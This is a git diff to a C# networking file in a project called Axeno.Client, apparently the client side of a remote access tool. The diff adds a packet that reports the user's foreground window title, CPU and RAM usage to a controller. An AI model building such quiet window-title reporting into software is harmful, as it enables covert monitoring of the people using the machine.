@@ -1,9 +1,11 @@
 ﻿using Axeno.Client.Helper;
+using Axeno.Client.MessagePack;
 using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
@@ -16,7 +18,7 @@ namespace Axeno.Client.Networking.Functions
 
         public static void Reconnect()
         {
-            Process.Start(System.AppDomain.CurrentDomain.FriendlyName);
+            Process.Start(AppDomain.CurrentDomain.FriendlyName);
             Environment.Exit(0);
         }
         public static void Disconnect()
@@ -75,5 +77,36 @@ namespace Axeno.Client.Networking.Functions
             catch(Exception) { return; }
 
         }
+        public static byte[] UpdateStats()
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "UpdateInfo";
+            msgpack.ForcePathObject("ActiveWin").AsString = GetActiveWindowTitle();
+            msgpack.ForcePathObject("CPU%").AsString = SendInfo.CPU();
+            msgpack.ForcePathObject("RAM%").AsString = SendInfo.RAM();
+
+            return msgpack.Encode2Bytes();
+
+        }
+        public static string GetActiveWindowTitle()
+        {
+            try
+            {
+                const int nChars = 256;
+                StringBuilder buff = new StringBuilder(nChars);
+                IntPtr handle = GetForegroundWindow();
+                if (GetWindowText(handle, buff, nChars) > 0)
+                {
+                    return buff.ToString();
+                }
+            }
+            catch { }
+            return "";
+        }
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
     }
 }
+
